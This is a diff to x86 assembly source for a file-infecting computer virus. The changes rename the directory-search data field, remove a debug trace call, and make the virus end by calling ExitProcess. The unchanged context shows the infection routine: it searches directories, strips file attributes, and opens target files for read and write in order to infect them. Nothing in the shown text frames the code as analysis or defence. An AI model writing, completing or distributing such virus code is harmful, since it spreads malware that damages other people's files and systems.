@@ -39,7 +39,7 @@ struc DATA
     .WriteFile:               resd 1
 
     ; directory listing data
-    .search:                  resb 592
+    .FIND_DATA:               resb 592
 
     ; infection data
     .fileAlign:               resd 1
@@ -197,7 +197,7 @@ discard:
     mov     ecx, [ebp + DATA.FIND_DATA + 32]; read file size (lower 4 bytes)
     call    InfectFile
 again:
-    lea     ebx, [ebp + DATA.search]
+    lea     ebx, [ebp + DATA.FIND_DATA]
     push    ebx                             ; Push the address of the search record
     mov     ecx, edi
     push    ecx                             ; Push the file handle
@@ -263,7 +263,7 @@ InfectFile:
     ;; save the original attributes
 
     mov     [ebp + DATA.fileOffset], esi            ; ESI = pointer to filename ***
-    lea     ebx, [ebp + DATA.search + 44]
+    lea     ebx, [ebp + DATA.FIND_DATA + 44]
     push    ebx                                     ; Address to filename
     call    [ebp + DATA.GetFileAttributesA]         ; Get the file attributes
     cmp     eax, 0
@@ -272,7 +272,7 @@ InfectFile:
     ;; set the nomral attributes to the file
 
     push    80h                                     ; 80h = FILE_ATTRIBUTE_NORMAL
-    lea     ebx, [ebp + DATA.search + 44]
+    lea     ebx, [ebp + DATA.FIND_DATA + 44]
     push    ebx                                     ; Address to filename
     call    [ebp + DATA.SetFileAttributesA]         ; Get the file attributes
 
@@ -286,7 +286,7 @@ InfectFile:
     mov     ebx, 80000000h
     or      ebx, 40000000h
     push    ebx                                     ; General write and read
-    lea     ebx, [ebp + DATA.search + 44]
+    lea     ebx, [ebp + DATA.FIND_DATA + 44]
     push    ebx                                     ; Address to filename
     call    [ebp + DATA.CreateFileA]                ; create the file
                                                     ; EAX = file handle
@@ -643,9 +643,9 @@ InfectionSuccessful:
     clc
 
 OutOfHere:
-    PRINT_TRACE
+  PRINT_TRACE
     popad        ; Restore all registers
-    PRINT_TRACE
+  
     retn
 
 
@@ -693,4 +693,5 @@ getEIP:
 
 endOfVirus:
 
-    retn
+    push    0
+    call    _ExitProcess@4
